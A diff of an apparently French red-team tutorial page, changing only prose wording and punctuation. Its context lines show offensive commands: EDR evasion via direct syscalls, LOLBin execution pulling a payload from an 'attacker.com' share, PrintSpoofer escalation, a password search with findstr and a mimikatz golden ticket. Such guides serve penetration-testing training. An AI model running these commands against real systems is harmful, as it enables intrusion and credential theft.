@@ -80,7 +80,7 @@
                 </div>
 
                 <h2>Phase 1 : Reconnaissance</h2>
-                <p>La reconnaissance est la phase la plus critique. Elle détermine le succès de l'opération entière.</p>
+                <p>La reconnaissance détermine tout. Rater cette phase, c'est construire l'opération entière sur du sable.</p>
 
                 <h3>Reconnaissance passive (OSINT)</h3>
                 <table class="mitre-table">
@@ -167,7 +167,7 @@ gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-l
                 </div>
 
                 <h2>Phase 3 : Execution & Evasion</h2>
-                <p>L'évasion des EDR/AV est au cœur des opérations Red Team modernes.</p>
+                <p>L'évasion EDR/AV arrive très vite dans une opération Red Team moderne.</p>
 
                 <h3>AMSI Bypass</h3>
                 <p>AMSI (Antimalware Scan Interface) inspecte les scripts PowerShell et .NET avant exécution.
@@ -206,16 +206,16 @@ void patch_etw() {
 
                 <h3>Direct Syscalls (SysWhispers / Hell's Gate)</h3>
                 <p>Les EDR hookent les fonctions de ntdll.dll (NtAllocateVirtualMemory, NtWriteVirtualMemory, etc.)
-                    pour intercepter les appels suspects. Appeler les syscalls directement — sans passer par ntdll —
+                    pour intercepter les appels suspects. Appeler les syscalls directement, sans passer par ntdll,
                     contourne ces hooks. SysWhispers3 génère les stubs automatiquement :</p>
 
-                <pre><code">// Stub généré par SysWhispers — NtAllocateVirtualMemory
-// Le numéro de syscall est résolu dynamiquement au runtime
+                <pre><code">// Stub généré par SysWhispers : NtAllocateVirtualMemory
+// Le numéro de syscall est résolu au runtime
 // (Hell's Gate : lire le numéro depuis le ntdll non patché en mémoire)
 
 NtAllocateVirtualMemory_syscall:
     mov r10, rcx
-    mov eax, [résolu dynamiquement]   ; numéro syscall réel
+    mov eax, [résolu au runtime]      ; numéro syscall réel
     syscall
     ret</code></pre>
 
@@ -248,7 +248,7 @@ pcalua -a \\attacker.com\share\payload.exe
 forfiles /p C:\Windows\System32 /m notepad.exe /c "cmd /c payload.exe"
 
 # MSDTC (COM surrogate) : exécution via service légitime
-# Référence : LOLBAS — vérifier le statut détection avant usage en mission</code></pre>
+# Référence : LOLBAS : vérifier le statut détection avant usage en mission</code></pre>
 
                 <div class="purple-box">
                     <strong>Règle opérationnelle :</strong> Toujours vérifier le statut de détection d'un LOLBin
@@ -273,7 +273,7 @@ forfiles /p C:\Windows\System32 /m notepad.exe /c "cmd /c payload.exe"
                     </div>
                     <div class="c2-card">
                         <h4>Havoc</h4>
-                        <p>C2 moderne avec interface moderne. Demon agent très modulaire.</p>
+                        <p>C2 récent avec interface graphique bien conçue. Demon agent très modulaire.</p>
                         <span class="tag opsec">Open Source</span>
                     </div>
                     <div class="c2-card">
@@ -357,7 +357,7 @@ findstr /si password *.txt *.xml *.config
 .\PrintSpoofer64.exe -i -c "C:\Windows\System32\cmd.exe"</code></pre>
 
                 <h2>Phase 5 : Lateral Movement</h2>
-                <p>Le mouvement latéral permet de progresser dans le réseau vers les objectifs.</p>
+                <p>Le mouvement latéral sert à progresser dans le réseau vers les objectifs.</p>
 
                 <table class="mitre-table">
                     <thead>
@@ -476,10 +476,10 @@ mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21
                     <li><a href="https://github.com/BishopFox/sliver" target="_blank" rel="noopener">Sliver C2 Framework</a></li>
                     <li><a href="https://github.com/HavocFramework/Havoc" target="_blank" rel="noopener">Havoc Framework</a></li>
                     <li><a href="https://lolbas-project.github.io/" target="_blank" rel="noopener">LOLBAS Project</a></li>
-                    <li><a href="https://github.com/jthuraisamy/SysWhispers3" target="_blank" rel="noopener">SysWhispers3 — Direct Syscalls</a></li>
-                    <li><a href="https://github.com/trickster0/Ekko" target="_blank" rel="noopener">Ekko — Sleep Obfuscation</a></li>
+                    <li><a href="https://github.com/jthuraisamy/SysWhispers3" target="_blank" rel="noopener">SysWhispers3 : Direct Syscalls</a></li>
+                    <li><a href="https://github.com/trickster0/Ekko" target="_blank" rel="noopener">Ekko : Sleep Obfuscation</a></li>
                     <li><a href="https://posts.specterops.io/" target="_blank" rel="noopener">SpecterOps Blog</a></li>
-                    <li><a href="https://www.cobaltstrike.com/blog/sleep-mask-kit/" target="_blank" rel="noopener">Cobalt Strike — Sleep Mask Kit</a></li>
+                    <li><a href="https://www.cobaltstrike.com/blog/sleep-mask-kit/" target="_blank" rel="noopener">Cobalt Strike : Sleep Mask Kit</a></li>
                 </ul>
             </div>
         </article>
